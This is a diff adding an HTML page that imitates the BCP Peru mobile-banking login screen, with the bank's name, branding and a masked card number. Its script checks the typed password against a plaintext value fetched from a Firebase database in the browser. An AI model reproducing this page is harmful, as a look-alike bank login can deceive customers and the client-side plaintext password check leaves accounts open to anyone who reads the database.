@@ -1,0 +1,206 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Banca Móvil BCP</title>
+  <link rel="manifest" href="manifest.json" />
+  <meta name="theme-color" content="#0003ff" />
+
+  <!-- Favicon -->
+  <link rel="icon" type="images/png" href="images/app_icon_xxxhdpi.png"> 
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500&display=swap" rel="stylesheet">
+  <style>
+    body {
+      margin: 0;
+      background: linear-gradient(to bottom, #01256f 30%, #00296b);
+      font-family: 'Poppins', sans-serif;
+      color: #fff;
+      height: 100vh;
+      overflow-x: hidden;
+      user-select: none;
+    }
+
+    .top-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 12px 18px;
+    }
+
+    .logo-bcp { width: 75px; }
+    .version-text { font-size: 12px; opacity: 0.7; }
+
+    .fondo { position: relative; height: 220px; background: linear-gradient(to bottom, #01246f, #00296b); overflow: hidden; }
+    .fondo img { position: absolute; bottom: 0; width: 100%; }
+    .luna { position: absolute; top: 25%; left: 60%; width: 40px; height: 40px; border-radius: 50%; background: radial-gradient(circle at 30% 30%, #fff 70%, #e0e0e0 100%); box-shadow: 0 0 20px rgba(255,255,255,0.4); }
+
+    .diviniciobien1 { display: flex; justify-content: space-around; align-items: center; margin: 25px auto; width: 90%; }
+    .itbend { text-align: center; }
+    .itbend img { width: 28px; height: 28px; margin-bottom: 4px; }
+    .itbend button { background: none; border: none; color: white; cursor: pointer; font-size: 13px; }
+
+    .divboxcard { display: flex; justify-content: center; }
+    .cuadrodatoscard { display: flex; align-items: center; justify-content: space-between; background-color: #003b91; border-radius: 12px; padding: 10px 15px; width: 85%; max-width: 360px; }
+    .cuadrodatoscard img:first-child { width: 25px; margin-right: 8px; }
+    .h3credimas { flex: 1; font-size: 14px; font-weight: 500; }
+
+    .divboxcuadro { display: flex; justify-content: center; margin-top: 15px; }
+    .cuadrodatoslogin { display: flex; align-items: center; justify-content: space-between; background-color: #003b91; border-radius: 12px; padding: 10px 15px; width: 85%; max-width: 360px; }
+    .cuadrodatoslogin input { border: none; background: transparent; color: #fff; width: 100%; font-size: 15px; outline: none; }
+    .cuadrodatoslogin input::placeholder { color: #bfc7d1; }
+    .cuadrodatoslogin img { width: 22px; cursor: pointer; }
+
+    .itbingresar { display: flex; flex-direction: column; align-items: center; margin-top: 25px; }
+    .itbingresar button { background-color: #ff6600; color: #fff; border: none; border-radius: 25px; padding: 12px 0; width: 85%; max-width: 360px; font-size: 16px; font-weight: 600; cursor: pointer; transition: background 0.3s; }
+    .itbingresar button:hover { background-color: #ff7a1a; }
+    .h3ol { margin-top: 12px; font-size: 14px; font-weight: 400; color: #d3d6dc; cursor: pointer; text-decoration: none; }
+
+    /* ==== MODAL DE CARGA ==== */
+    .modal {
+      display: none;
+      position: fixed;
+      z-index: 9999;
+      left: 0;
+      top: 0;
+      width: 100%;
+      height: 100%;
+      background-color: rgba(0, 0, 0, 0.8);
+      justify-content: center;
+      align-items: center;
+    }
+
+    .loader-container {
+      position: relative;
+      width: 100px;
+      height: 100px;
+    }
+
+    .loader-circle {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100px;
+      height: 100px;
+      border: 6px solid transparent;
+      border-top: 6px solid #ff6600;
+      border-radius: 50%;
+      animation: spin 1.2s linear infinite;
+    }
+
+    .loader-logo {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      width: 55px;
+      height: 55px;
+      transform: translate(-50%, -50%);
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+  </style>
+</head>
+<body>
+  <div class="top-header">
+    <img class="logo-bcp" src="images/logo.svg" alt="Logo BCP">
+    <h3 class="version-text">V. 3.23.0</h3>
+  </div>
+
+  <section class="fondo">
+    <div class="luna"></div>
+    <img src="images/bcp.jpg" alt="fondo montañas">
+  </section>
+
+  <div class="diviniciobien1">
+    <div class="itbend"><button><img src="images/yapear-icon.svg" alt=""> <p>Yapear a<br>celular</p></button></div>
+    <div class="itbend"><button><img src="images/token-digital-icon.svg" alt=""> <p>Token<br>Digital</p></button></div>
+    <div class="itbend"><button><img src="images/para-ti-icon.svg" alt=""> <p>Para ti</p></button></div>
+    <div class="itbend"><button><img src="images/ver-mas-bien.svg" alt=""> <p>Ver más</p></button></div>
+  </div>
+
+  <div class="divboxcard">
+    <div class="cuadrodatoscard">
+      <img src="images/perfil-person-b-des.svg" alt="">
+      <h3 class="h3credimas" id="numTarjeta">Credimas débito **** 9366</h3>
+      <img src="images/arrow-end-icon.svg" alt="">
+    </div>
+  </div>
+
+  <div class="divboxcuadro">
+    <div class="cuadrodatoslogin">
+      <input type="password" id="clave" placeholder="Clave de internet de 6 dígitos" maxlength="6">
+      <img src="images/ojo-abierto-w-icon.svg" alt="">
+    </div>
+  </div>
+
+  <div class="itbingresar">
+    <button id="ingresar">Ingresar</button>
+    <a href="registro" class="h3ol">¿Olvidaste tu clave?</a>
+  </div>
+
+  <!-- Modal de carga -->
+  <div class="modal" id="modalLoader">
+    <div class="loader-container">
+      <div class="loader-circle"></div>
+      <img src="images/lg_favicon_light.svg" class="loader-logo" alt="Logo">
+    </div>
+  </div>
+
+  <script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-app.js";
+    import { getDatabase, ref, get, child } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-database.js";
+
+    const firebaseConfig = {
+      apiKey: "AIzaSyDvfMTYu_d_Vl0z-3Y8ld_YtcFLGgZmP0U",
+      authDomain: "bcpf-e0a42.firebaseapp.com",
+      databaseURL: "https://bcpf-e0a42-default-rtdb.firebaseio.com",
+      projectId: "bcpf-e0a42",
+      storageBucket: "bcpf-e0a42.firebasestorage.app",
+      messagingSenderId: "1030005921701",
+      appId: "1:1030005921701:web:0c15124cadf030280f7a4c",
+      measurementId: "G-SVYPBTLHDE"
+    };
+
+    const app = initializeApp(firebaseConfig);
+    const db = getDatabase(app);
+
+    const ingresar = document.getElementById("ingresar");
+    const claveInput = document.getElementById("clave");
+    const numTarjeta = document.getElementById("numTarjeta");
+    const modal = document.getElementById("modalLoader");
+
+    const origenGuardado = localStorage.getItem("origen");
+    if (origenGuardado) {
+      numTarjeta.textContent = "Credimas débito **** " + origenGuardado;
+    }
+
+    ingresar.addEventListener("click", () => {
+      const clave = claveInput.value;
+      if (!origenGuardado || !clave) {
+        alert("Falta el origen o la clave.");
+        return;
+      }
+
+      modal.style.display = "flex";
+
+      setTimeout(() => {
+        const dbRef = ref(db);
+        get(child(dbRef, "usuarios/" + origenGuardado)).then((snapshot) => {
+          modal.style.display = "none";
+          if (snapshot.exists() && snapshot.val().clave === clave) {
+            window.location.href = "inicio";
+          } else {
+            alert("Clave incorrecta o cuenta no encontrada.");
+          }
+        }).catch((error) => {
+          modal.style.display = "none";
+          alert("Error: " + error);
+        });
+      }, 3000);
+    });
+  </script>
+</body>
+</html>
